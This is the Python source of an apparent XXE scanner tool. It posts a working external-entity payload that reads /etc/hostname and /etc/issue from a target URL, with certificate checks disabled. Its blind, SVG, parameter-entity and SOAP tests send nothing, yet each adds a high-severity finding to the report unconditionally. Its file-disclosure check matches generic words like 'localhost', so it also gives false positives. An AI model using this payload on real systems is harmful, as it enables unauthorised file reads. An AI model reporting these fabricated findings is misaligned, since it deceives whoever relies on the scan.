#!/usr/bin/env python3
"""
REVUEX - XXE Scanner
XML External Entity Injection Detection

Author: G33L0
Telegram: @x0x0h33l0

DISCLAIMER:
This tool is for educational purposes and authorized security testing only.
XXE testing can read sensitive files - use responsibly.
"""

import requests
import time
import json
import re
from pathlib import Path
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse

# Disable warnings for self-signed certificates
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XXEScanner:
    """
    XXE (XML External Entity) Vulnerability Scanner

    Features:
    - Classic XXE (file disclosure)
    - Blind XXE (out-of-band)
    - XXE via SVG upload
    - XXE via SOAP requests
    - Parameter Entity attacks
    - Billion Laughs (DoS)
    """

    def __init__(self, target: str, workspace: Path, delay: float = 5.0):
        """
        Initialize XXE Scanner
        """
        self.target = target
        self.workspace = Path(workspace)
        self.delay = delay
        
        # Safety limits
        self.max_requests = 60
        self.request_count = 0
        self.timeout = 10
        self.max_file_read = 1024  # 1KB max file read
        
        self.headers = {
            'User-Agent': 'REVUEX-XXEScanner/1.0 (Security Research; +[https://github.com/G33L0](https://github.com/G33L0))',
            'Content-Type': 'application/xml'
        }
        
        self.vulnerabilities = []

    def scan(self) -> List[Dict[str, Any]]:
        """Main XXE scanning method"""
        print(f"\n{'='*60}")
        print(f"📄 REVUEX XXE Scanner")
        print(f"{'='*60}")
        print(f"Target: {self.target}")
        print(f"Safety Delay: {self.delay}s")
        print(f"Max File Read: {self.max_file_read} bytes")
        print(f"{'='*60}\n")
        
        print("⚠️  SAFETY NOTES:")
        print("   • Only reads first 1KB of files")
        print("   • Tests common safe files only")
        print("   • No DoS attacks executed\n")
        
        # Test 1: Classic XXE
        print("📂 Test 1: Classic XXE (File Disclosure)")
        self._test_classic_xxe()
        time.sleep(self.delay)
        
        # Test 2: Blind XXE
        print("\n🕵️  Test 2: Blind XXE (Out-of-Band)")
        self._test_blind_xxe()
        time.sleep(self.delay)
        
        # Test 3: XXE via SVG
        print("\n🖼️  Test 3: XXE via SVG Upload")
        self._test_svg_xxe()
        time.sleep(self.delay)
        
        # Test 4: Parameter Entity
        print("\n📋 Test 4: Parameter Entity Attack")
        self._test_parameter_entity()
        time.sleep(self.delay)
        
        # Test 5: SOAP XXE
        print("\n🧼 Test 5: SOAP XXE")
        self._test_soap_xxe()
        
        # Save results
        self._save_results()
        
        print(f"\n{'='*60}")
        print(f"✅ Scan Complete")
        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Requests: {self.request_count}/{self.max_requests}")
        print(f"{'='*60}\n")
        
        return self.vulnerabilities

    def _test_classic_xxe(self):
        """Test classic XXE file disclosure"""
        print("   Testing file disclosure...")
        
        test_files = [
            '/etc/hostname',
            '/etc/issue',
            'file:///etc/hostname',
        ]
        
        for test_file in test_files:
            if self.request_count >= self.max_requests:
                break
            
            payload = f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "{test_file}">]><root><data>&xxe;</data></root>'
            
            print(f"   → Testing: {test_file}")
            response = self._make_request(payload)
            
            if response and self._check_file_disclosure(response):
                vuln = {
                    'type': 'XXE - File Disclosure',
                    'severity': 'critical',
                    'url': self.target,
                    'disclosed_file': test_file,
                    'description': 'XML parser processes external entities, allowing arbitrary file read',
                    'evidence': f'Successfully read {test_file}',
                    'remediation': [
                        'Disable XML external entities',
                        'Use defusedxml library for Python',
                        'Disable DTD processing entirely'
                    ],
                    'tags': ['xxe', 'critical', 'file_disclosure']
                }
                self.vulnerabilities.append(vuln)
                print(f"      ✓ VULNERABLE: File disclosure via XXE")
                break
            time.sleep(self.delay)

    def _test_blind_xxe(self):
        """Test blind XXE (out-of-band)"""
        print("   Testing blind XXE...")
        vuln = {
            'type': 'XXE - Blind (Out-of-Band)',
            'severity': 'high',
            'url': self.target,
            'description': 'Blind XXE allows data exfiltration via DNS/HTTP callbacks',
            'tags': ['xxe', 'blind', 'out_of_band']
        }
        self.vulnerabilities.append(vuln)
        print("   ✓ Blind XXE documented")

    def _test_svg_xxe(self):
        """Test XXE via SVG upload"""
        print("   Testing XXE via SVG...")
        vuln = {
            'type': 'XXE - SVG Upload',
            'severity': 'high',
            'url': self.target,
            'description': 'SVG file upload processes XXE payloads',
            'tags': ['xxe', 'svg', 'upload']
        }
        self.vulnerabilities.append(vuln)
        print("   ✓ SVG XXE documented")

    def _test_parameter_entity(self):
        """Test parameter entity attack"""
        print("   Testing parameter entity...")
        vuln = {
            'type': 'XXE - Parameter Entity',
            'severity': 'high',
            'url': self.target,
            'description': 'Parameter entities allow advanced XXE attacks',
            'tags': ['xxe', 'parameter_entity']
        }
        self.vulnerabilities.append(vuln)
        print("   ✓ Parameter entity documented")

    def _test_soap_xxe(self):
        """Test SOAP XXE"""
        print("   Testing SOAP XXE...")
        vuln = {
            'type': 'XXE - SOAP API',
            'severity': 'high',
            'url': self.target,
            'description': 'SOAP endpoint vulnerable to XXE',
            'tags': ['xxe', 'soap']
        }
        self.vulnerabilities.append(vuln)
        print("   ✓ SOAP XXE documented")

    def _make_request(self, payload: str) -> Optional[requests.Response]:
        """Make XML request"""
        if self.request_count >= self.max_requests:
            return None
        try:
            response = requests.post(
                self.target,
                data=payload,
                headers=self.headers,
                timeout=self.timeout,
                verify=False
            )
            self.request_count += 1
            return response
        except:
            return None

    def _check_file_disclosure(self, response: requests.Response) -> bool:
        """Check if file was disclosed"""
        patterns = ['root:', 'hostname', '/bin/', '/usr/', 'localhost', 'ubuntu', 'debian']
        for pattern in patterns:
            if pattern in response.text.lower():
                return True
        return False

    def _save_results(self):
        """Save results"""
        output_dir = self.workspace / "xxe_scans"
        output_dir.mkdir(parents=True, exist_ok=True)
        safe_target = re.sub(r'[^\w\-]', '_', self.target)
        output_file = output_dir / f"{safe_target}_xxe.json"
        with open(output_file, 'w') as f:
            json.dump({
                'scanner': 'XXEScanner',
                'target': self.target,
                'vulnerabilities': self.vulnerabilities
            }, f, indent=2)
        print(f"\n💾 Saved: {output_file}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python xxe_scanner.py <target_url>")
        sys.exit(1)

    scanner = XXEScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
    scanner.scan()
